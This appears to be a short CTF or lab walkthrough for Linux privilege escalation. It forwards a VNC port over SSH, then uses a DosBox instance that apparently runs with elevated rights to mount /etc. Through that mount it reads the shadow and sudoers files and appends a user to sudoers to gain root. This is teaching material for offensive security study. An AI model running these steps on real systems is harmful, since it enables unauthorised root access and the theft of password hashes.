#### VNC to DosBox

```bash - linux
netstat -tulpn
```

Look for VNC service:

We see VNC on port 5901.  Let's use port forwarding to access.
Kali:
```bash - kali
ssh -L 5901:localhost:5901 commander@$TARGET
```

Kali:
```bash - kali
vncviewer localhost:5901
```

Now we can open terminal in vncviewer and run dosbox:
```bash - target
dosbox
```

Let's mount the /etc directory to C:

```dosbox - target
mount C /etc
```

Change to the C drive:
```dosbox - target
C:
```

Check to see if you can read a high privileged file (shadow):
```dosbox - target
type shadow
```

```dosbox - target
type sudoers
```

Let's put our current user into the sudoers file:
```dosbox - target
echo <USER> ALL=(ALL) ALL >> sudoers
```

Now back in target terminal:
```bash - target
sudo -i
```
